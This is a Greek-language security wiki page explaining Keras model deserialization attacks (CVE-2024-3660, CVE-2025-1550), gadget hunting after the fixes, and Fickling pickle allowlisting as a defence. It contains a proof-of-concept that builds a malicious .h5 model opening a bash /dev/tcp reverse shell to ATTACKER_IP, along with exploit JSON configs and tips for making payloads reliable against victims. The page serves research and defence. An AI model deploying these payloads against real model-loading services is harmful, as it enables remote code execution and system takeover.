# Keras Αποσειριοποίηση Μοντέλου RCE και Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης εναντίον της pipeline αποσειριοποίησης μοντέλων του Keras, εξηγεί τα εσωτερικά της εγγενούς μορφής .keras και την επιφάνεια επίθεσης, και παρέχει ένα toolkit για ερευνητές για την εύρεση Model File Vulnerabilities (MFVs) και post-fix gadgets.

## .keras εσωτερικά μορφής μοντέλου

Ένα αρχείο .keras είναι ένα ZIP archive που περιέχει τουλάχιστον:
- metadata.json – γενικές πληροφορίες (π.χ. έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json καθοδηγεί την αναδρομική αποσειριοποίηση: ο Keras εισάγει modules, επιλύει κλάσεις/συναρτήσεις και ανασυνθέτει στρώματα/αντικείμενα από λεξικά ελεγχόμενα από τον επιτιθέμενο.

Παράδειγμα αποσπάσματος για ένα αντικείμενο Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Η αποσειριοποίηση εκτελεί:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Ιστορικά, αυτό αποκάλυπτε τρεις πρωτογενείς δυνατότητες σε έναν επιτιθέμενο που δημιουργεί config.json:
- Control of what modules are imported
- Control of which classes/functions are resolved
- Control of kwargs passed into constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Βασική αιτία:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Ιδέα εκμετάλλευσης (απλοποιημένο payload σε config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Αντιμετώπιση:
- Keras επιβάλλει safe_mode=True από προεπιλογή. Serialized Python functions στο Lambda μπλοκάρονται εκτός εάν ο χρήστης ρητά απενεργοποιήσει με safe_mode=False.

Σημειώσεις:
- Legacy formats (older HDF5 saves) ή παλαιότερα codebases μπορεί να μην εφαρμόζουν τους σύγχρονους ελέγχους, οπότε “downgrade” style attacks μπορούν ακόμα να ισχύουν όταν τα θύματα χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Αυθαίρετη εισαγωγή module στο Keras ≤ 3.8

Βασική αιτία:
- _retrieve_class_or_fn χρησιμοποιούσε ανεξέλεγκτο importlib.import_module() με attacker-controlled module strings από config.json.
- Επίπτωση: Αυθαίρετη εισαγωγή οποιουδήποτε εγκατεστημένου module (ή attacker-planted module στο sys.path). Εκτελείται import-time code, και στη συνέχεια η κατασκευή του αντικειμένου συμβαίνει με attacker kwargs.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Βελτιώσεις ασφάλειας (Keras ≥ 3.9):
- Λευκή λίστα μονάδων: τα imports περιορίζονται στα επίσημα modules του οικοσυστήματος: keras, keras_hub, keras_cv, keras_nlp
- Προεπιλεγμένη safe mode: safe_mode=True αποτρέπει το φόρτωμα μη ασφαλών Lambda serialized-function
- Βασικός έλεγχος τύπων: τα deserialized αντικείμενα πρέπει να αντιστοιχούν στους αναμενόμενους τύπους

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Πολλές production stacks εξακολουθούν να δέχονται legacy TensorFlow-Keras HDF5 model files (.h5). Αν ένας attacker μπορεί να ανεβάσει ένα μοντέλο που ο server αργότερα φορτώνει ή τρέχει inference πάνω του, ένα Lambda layer μπορεί να εκτελέσει αυθαίρετο Python κατά το load/build/predict.

Ελάχιστο PoC για να κατασκευάσετε ένα κακόβουλο .h5 που εκτελεί ένα reverse shell όταν deserialized ή χρησιμοποιηθεί:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Σημειώσεις και συμβουλές αξιοπιστίας:
- Σημεία ενεργοποίησης: ο κώδικας μπορεί να εκτελεστεί πολλές φορές (π.χ., κατά το layer build/first call, model.load_model, και predict/fit). Κάντε τα payloads idempotent.
- Κλείδωμα έκδοσης: ταιριάξτε το victim’s TF/Keras/Python για να αποφύγετε serialization mismatches. Για παράδειγμα, κατασκευάστε artifacts υπό Python 3.8 με TensorFlow 2.13.1 αν αυτό χρησιμοποιεί ο στόχος.
- Γρήγορη αναπαραγωγή περιβάλλοντος:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Επαλήθευση: ένα ακίνδυνο payload όπως os.system("ping -c 1 YOUR_IP") βοηθά στην επιβεβαίωση της εκτέλεσης (π.χ., παρακολούθηση ICMP με tcpdump) πριν τη μετάβαση σε reverse shell.

## Επιφάνεια gadget μετά τη διόρθωση εντός του allowlist

Ακόμα και με allowlisting και safe mode, μια ευρεία επιφάνεια παραμένει ανάμεσα στις επιτρεπόμενες Keras callables. Για παράδειγμα, keras.utils.get_file μπορεί να κατεβάσει αυθαίρετα URLs σε θέσεις επιλεγμένες από τον χρήστη.

Gadget μέσω Lambda που αναφέρεται σε επιτρεπόμενη συνάρτηση (όχι σειριοποιημένο Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Σημαντικός περιορισμός:
- Lambda.call() προθέτει το input tensor ως το πρώτο positional argument όταν καλεί το target callable. Τα επιλεγμένα gadgets πρέπει να ανεχτούν ένα επιπλέον positional arg (ή να δέχονται *args/**kwargs). Αυτό περιορίζει ποιες συναρτήσεις είναι βιώσιμες.

## ML pickle import allowlisting for AI/ML models (Fickling)

Πολλές μορφές μοντέλων AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, etc.) ενσωματώνουν δεδομένα Python pickle. Οι επιτιθέμενοι συστηματικά καταχρώνται pickle GLOBAL imports και object constructors για να επιτύχουν RCE ή model swapping κατά το load. Σαρωτές βασισμένοι σε blacklist συχνά χάνουν νέες ή μη καταχωρημένες επικίνδυνες εισαγωγές.

Μια πρακτική fail-closed άμυνα είναι να κάνουν hook τον pickle deserializer του Python και να επιτρέπουν μόνο ένα ελεγμένο σύνολο αβλαβών εισαγωγών σχετικών με ML κατά το unpickling. Trail of Bits’ Fickling υλοποιεί αυτήν την πολιτική και παρέχει μια επιμελημένη ML import allowlist χτισμένη από χιλιάδες δημόσια Hugging Face pickles.

Μοντέλο ασφάλειας για “safe” imports (διαισθήσεις αποσταγμένες από έρευνα και πρακτική): τα εισαγόμενα σύμβολα που χρησιμοποιεί ένα pickle πρέπει ταυτόχρονα:
- Να μην εκτελούν κώδικα ή να προκαλούν εκτέλεση (no compiled/source code objects, shelling out, hooks, etc.)
- Να μην κάνουν get/set αυθαίρετων attributes ή items
- Να μην εισάγουν ή λαμβάνουν αναφορές σε άλλα Python objects από το pickle VM
- Να μην ενεργοποιούν οποιουσδήποτε δευτερεύοντες deserializers (π.χ., marshal, nested pickle), ακόμη και έμμεσα

Ενεργοποιήστε τις προστασίες του Fickling όσο το δυνατόν νωρίτερα στο startup της διεργασίας ώστε οποιαδήποτε pickle loads που εκτελούνται από frameworks (torch.load, joblib.load, etc.) να ελέγχονται:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Συμβουλές λειτουργίας:
- Μπορείτε προσωρινά να απενεργοποιήσετε/επαναενεργοποιήσετε τα hooks όπου χρειάζεται:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Εάν ένα γνωστό-καλό μοντέλο αποκλείεται, επεκτείνετε την allowlist για το περιβάλλον σας αφού ελέγξετε τα σύμβολα:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Το Fickling επίσης εκθέτει γενικούς προστατευτικούς μηχανισμούς χρόνου εκτέλεσης αν προτιμάτε πιο λεπτομερή έλεγχο:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Προτιμήστε μη-pickle μορφές μοντέλων όταν είναι δυνατόν (π.χ., SafeTensors). Αν πρέπει να αποδεχτείτε pickle, τρέξτε τους loaders με ελάχιστα προνόμια χωρίς δικτυακή έξοδο και εφαρμόστε την allowlist.

Αυτή η allowlist-first στρατηγική αποδεδειγμένα μπλοκάρει κοινά ML pickle exploit μονοπάτια ενώ διατηρεί υψηλή συμβατότητα. Στο benchmark του ToB, το Fickling εντόπισε ως επικίνδυνα το 100% των συνθετικών κακόβουλων αρχείων και επέτρεψε περίπου 99% των καθαρών αρχείων από κορυφαία repositories του Hugging Face.


## Εργαλειοθήκη ερευνητή

1) Συστηματική ανακάλυψη gadget σε allowlisted modules

Καταγράψτε υποψήφια callables στα keras, keras_nlp, keras_cv, keras_hub και δώστε προτεραιότητα σε αυτά με side effects σε file/network/process/env.

<details>
<summary>Καταγραφή πιθανώς επικίνδυνων callables σε allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Άμεση δοκιμή deserialization (no .keras archive needed)

Τροφοδοτήστε επιμελώς κατασκευασμένα dicts απευθείας στους Keras deserializers για να μάθετε ποια params γίνονται αποδεκτά και να παρατηρήσετε παρενέργειες.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Έλεγχος μεταξύ εκδόσεων και μορφών

Το Keras υπάρχει σε πολλαπλές βάσεις κώδικα/εποχές με διαφορετικούς μηχανισμούς προστασίας και μορφές:
- TensorFlow built-in Keras: tensorflow/python/keras (παρωχημένο, προγραμματισμένο για διαγραφή)
- tf-keras: συντηρείται ξεχωριστά
- Multi-backend Keras 3 (official): εισήγαγε εγγενές .keras

Επαναλάβετε δοκιμές σε όλες τις βάσεις κώδικα και μορφές (.keras vs legacy HDF5) για να αποκαλύψετε παλινδρομήσεις ή ελλείψεις μηχανισμών προστασίας.

## Αναφορές

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
